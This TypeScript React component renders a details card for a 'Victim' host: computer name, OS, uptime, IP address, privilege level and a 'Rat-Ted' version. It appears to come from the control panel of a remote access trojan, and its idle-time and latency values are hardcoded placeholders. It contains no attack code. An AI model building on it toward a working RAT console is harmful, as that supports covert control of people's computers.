import { MdComputer, MdNetworkWifi, MdSettings } from "react-icons/md";

type DetailsProps = {
  client: Victim;
};

const Details: React.FC<DetailsProps> = ({client}) => {
  return (
    <div className="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-6">
      <div className="col-span-1 sm:col-span-2">
        <h1 className="text-xl font-bold">
          <MdComputer className="inline text-blue-700 dark:text-blue-300" />{" "}
          System Info:
        </h1>
        <div className="bg-white dark:bg-gray-900 rounded-lg p-4 shadow-md mt-4">
          <p className="text-gray-500 dark:text-gray-400">
            Computer Name: {client.Name}
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            OS Platform: {client.System}
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            OS Version: {client.Version}
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            System Uptime: {client.Uptime}
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            Idle Time: 50 minutes
          </p>
        </div>
      </div>
      <div className="col-span-1">
        <h1 className="text-xl font-bold">
          <MdNetworkWifi className="inline text-blue-700 dark:text-blue-300" />{" "}
          Network Info:
        </h1>
        <div className="bg-white dark:bg-gray-900 rounded-lg p-4 shadow-md mt-4">
          <p className="text-gray-500 dark:text-gray-400">
            Status:{" "}
            <span
              className={`${
                "Online".toLowerCase() === "online"
                  ? "text-green-500"
                  : "text-red-500 "
              }`}
            >
              Online
            </span>
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            Latency:{" "}
            <span
              className={`
                  ${parseInt("32") < 50 && "text-green-500"}
                  ${
                    parseInt("32") > 50 &&
                    parseInt("32") < 99 &&
                    "text-yellow-500"
                  }
                  ${32 > 99 && "text-red-500"}
                `}
            >
              32
            </span>
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            IP Address: {client.IPv4}
          </p>
        </div>
      </div>
      <div className="col-span-1">
        <h1 className="text-xl font-bold">
          <MdSettings className="inline text-blue-700 dark:text-blue-300" />{" "}
          Rat-Ted Settings:
        </h1>
        <div className="bg-white dark:bg-gray-900 rounded-lg p-4 shadow-md mt-4">
          <p className="text-gray-500 dark:text-gray-400">
            Privilege Level: {client.Privileges}
          </p>
          <p className="text-gray-500 dark:text-gray-400">
            Rat-Ted Version: {client.RatTedVersion}
          </p>
        </div>
      </div>
    </div>
  );
};

export default Details;
